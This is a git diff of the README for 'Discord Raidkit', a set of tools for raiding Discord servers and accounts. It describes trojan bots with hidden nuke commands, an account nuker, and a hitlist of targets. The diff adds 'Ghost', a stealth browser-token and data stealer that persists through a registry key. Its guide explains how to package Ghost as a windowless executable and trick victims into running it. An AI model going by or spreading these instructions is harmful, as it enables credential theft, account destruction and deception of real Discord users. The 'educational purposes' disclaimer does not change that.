@@ -15,21 +15,23 @@ These tools are made for educational purposes. **By using these tools, you agree
 ---
 # Discord Raidkit
 
-[Installation Guide](#installation-guide) | [Anubis Guide](#anubis-guide) | [Qetesh Guide](#qetesh-guide) | [Osiris Guide](#osiris-guide) | [Thoth Guide](#thoth-guide)
-![Discord Raidkit v1.5.4 Image](https://user-images.githubusercontent.com/66549839/99922335-fad26900-2d27-11eb-8e15-3b69dccb48ac.png)
+[Introduction](#discord-raidkit) | [Anubis Guide](#anubis-guide) | [Qetesh Guide](#qetesh-guide) | [Osiris Guide](#osiris-guide) | [Thoth Guide](#thoth-guide) | [Ghost Guide](#ghost-guide)
+![Discord Raidkit v1.5.4 Image](https://media.discordapp.net/attachments/833694868248985673/834936090086735892/image0.jpg?width=1440&height=232)
 Discord Raidkit is a free collection of programs designed raid servers and accounts as effectively as possible. The following is a list of all the programs currently included:
 
 - **Anubis** is a discord multi-purpose nuker bot. However, unlike several other nuker bots, Anubis is designed to resemble a trojan horse by including many helpful features, with malicious commands hidden inside.  
 - **Qetesh** is a custom version of Anubis, designed to be a trojan of a porn bot - it has the full capabilities of a porn bot with the same hidden commands of Anubis, allowing you to prey on those lost within their own lust.
 - **Osiris** is a redesign of the "Jajaja Account Nuker" created by [@azaelgg](https://github.com/azaelgg) (Permission granted). It contains a fresh new look and provides a few usability improvements.
 - **Thoth** is a tool designed to keep track of accounts you are targetting - an advanced hitlist, if you will. You can add accounts, remove accounts, display accounts, edit accounts and do pretty much anything else you'd need to do with items on a hitlist. You can even view the JSON containing the accounts in fancy colours.
+- **Ghost** is a logging tool to stealthly gain access to anyones token for up to 10+ browsers including chromium and custom based-software browsers you can also pull any sensitive information, it writes a registry key so the tool can send you info every time the computer boots or from time to time, you can configure everything as you like.
+
 
 These tool's full potential will be discussed in seperate guides further down the README.md file, along with an analysis on how they work and tips for getting the best results.
 
 
 ---
 ### Installation Guide
-[Introduction](#discord-raidkit) | [Anubis Guide](#anubis-guide) | [Qetesh Guide](#qetesh-guide) | [Osiris Guide](#osiris-guide) | [Thoth Guide](#thoth-guide)
+[Introduction](#discord-raidkit) | [Anubis Guide](#anubis-guide) | [Qetesh Guide](#qetesh-guide) | [Osiris Guide](#osiris-guide) | [Thoth Guide](#thoth-guide) | [Ghost Guide](#ghost-guide)
 
 [*Click HERE for a video guide*](https://youtu.be/ahYtsKzKd8w)
 
@@ -50,7 +52,7 @@ In order to make the most of this installation guide, please follow the instruct
 
 ---
 ### Anubis Guide
-[Introduction](#discord-raidkit) | [Installation Guide](#installation-guide) | [Qetesh Guide](#qetesh-guide) | [Osiris Guide](#osiris-guide) | [Thoth Guide](#thoth-guide)
+[Introduction](#discord-raidkit) | [Anubis Guide](#anubis-guide) | [Qetesh Guide](#qetesh-guide) | [Osiris Guide](#osiris-guide) | [Thoth Guide](#thoth-guide) | [Ghost Guide](#ghost-guide)
 
 To first use Anubis, run the `main.py` file. You should be greeted with a warning screen - simply press the return (enter) key. You should now notice a new file, named `run_settings.json`. Within this file, there are three settings that you must determine before using Anubis (Open the JSON file with notepad if you have no default program):
 1. Replace the default password text with your PostreSQL master password.
@@ -104,7 +106,7 @@ If word ever gets out about this bot, note that you can always tweak the code it
 
 ---
 ### Qetesh Guide
-[Introduction](#discord-raidkit) | [Installation Guide](#installation-guide) | [Anubis Guide](#anubis-guide) | [Osiris Guide](#osiris-guide) | [Thoth Guide](#thoth-guide)
+[Introduction](#discord-raidkit) | [Anubis Guide](#anubis-guide) | [Qetesh Guide](#qetesh-guide) | [Osiris Guide](#osiris-guide) | [Thoth Guide](#thoth-guide) | [Ghost Guide](#ghost-guide)
 
 To first use Qetesh, run the `main.py` file. You should be greeted with a warning screen - simply press the return (enter) key. You should now notice a new file, named `run_settings.json`. Within this file, there are two settings that you must determine before using Qetesh (Open the JSON file with notepad if you have no default program):
 
@@ -159,7 +161,7 @@ If word ever gets out about this bot, note that you can always tweak the code it
 
 ---
 ### Osiris Guide
-[Introduction](#discord-raidkit) | [Installation Guide](#installation-guide) | [Anubis Guide](#anubis-guide) | [Qetesh Guide](#qetesh-guide) | [Thoth Guide](#thoth-guide)
+[Introduction](#discord-raidkit) | [Anubis Guide](#anubis-guide) | [Qetesh Guide](#qetesh-guide) | [Osiris Guide](#osiris-guide) | [Thoth Guide](#thoth-guide) | [Ghost Guide](#ghost-guide)
 
 To use Osiris, run the `main.py` file. The usage of Osiris is straight-forward, so I'll quickly cover it, then spend most of this guide linking various resources to gaining that crucial holy-grail; the targets Auth token.
 - Nuking the targets account will remove their friends, servers, change their language to symbols and, whilst active at least, flick between dark and light mode (although this stops when Osiris is exited). When Osiris asks you for the number of threads, just put **10** or something.
@@ -194,6 +196,31 @@ Codes are used as reference points, as stated earlier. For example, when running
 **Disclaimer: I am not responsible for anyone's actions in regards to the Thoth Tool. If people use it on innocents, I'm not to blame.**
 
 ---
+---
+### Ghost Guide
+[Introduction](#discord-raidkit) | [Anubis Guide](#anubis-guide) | [Qetesh Guide](#qetesh-guide) | [Osiris Guide](#osiris-guide) | [Thoth Guide](#thoth-guide) | [Ghost Guide](#ghost-guide)
+
+**To use Ghost, Download The File Ghost.py in /Ghost - Stealth Logger or simply copy and paste the data**
+**After that, open the file in an ide or code editor then use one of the following options** <br>
+```
+$ Download A Py2Exe or any python to exe program,
+
+$ Next, Use the PYW file format instead of PY file format so no gui or console pops up in the victims screen bitmap,
+
+$ After those two, package the file to any victim and social engineer them to run it.
+```
+
+
+### Known Bugs :
+```
+$ No Cookie data being sent ; Results: Either the victim has none of the browsers stated in path or a error happened / ended script early.
+
+$ No ip,data or embed just blank ; Results:  Unknown error in script
+
+$ Just ip, ; Results: same error as first or second
+```
+
+---
 ## 🌟 Remember to star this repository if it has helped you! 🌠
 
-[Introduction](#discord-raidkit) | [Installation Guide](#installation-guide) | [Anubis Guide](#anubis-guide) | [Qetesh Guide](#qetesh-guide) | [Osiris Guide](#osiris-guide)
+[Introduction](#discord-raidkit) | [Anubis Guide](#anubis-guide) | [Qetesh Guide](#qetesh-guide) | [Osiris Guide](#osiris-guide) | [Thoth Guide](#thoth-guide) | [Ghost Guide](#ghost-guide)
